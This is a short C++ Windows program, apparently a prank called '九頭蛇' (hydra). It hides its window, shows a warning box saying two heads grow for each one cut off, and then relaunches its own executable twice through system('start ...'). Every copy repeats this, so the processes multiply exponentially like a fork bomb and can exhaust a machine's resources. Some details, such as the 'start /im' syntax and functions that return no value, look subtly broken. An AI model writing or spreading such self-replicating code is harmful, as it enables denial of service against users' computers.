#include<iostream>
#include<iomanip>
#include<cstring>
#include<cmath>
#include<windows.h>
#include<algorithm>
#include<time.h>
#include<stdlib.h> 
using namespace std;
int hydra(){
	int spawn=MessageBox(NULL,"砍掉一顆頭就會生出兩顆!!","我是九頭蛇!!", MB_ICONWARNING );
	return spawn;
}
int hidewindow(){
	ShowWindow(GetForegroundWindow(),SW_HIDE);
	srand(time(NULL));
}
int randwindow(){
	int x = GetSystemMetrics(SM_CXSCREEN)-250;
	int y = GetSystemMetrics(SM_CYSCREEN)-160;
	int rx=(rand()%(x+1));
	int ry=(rand()%(y+1));
	Sleep(100); 
	MoveWindow(GetForegroundWindow(),rx,ry,250,160,1);
}
int main(){
	hidewindow();
	int a=hydra();
	if(a>0){
		system("start /im 九頭蛇.exe");
		randwindow();
		system("start /im 九頭蛇.exe");
		randwindow();
	}
}

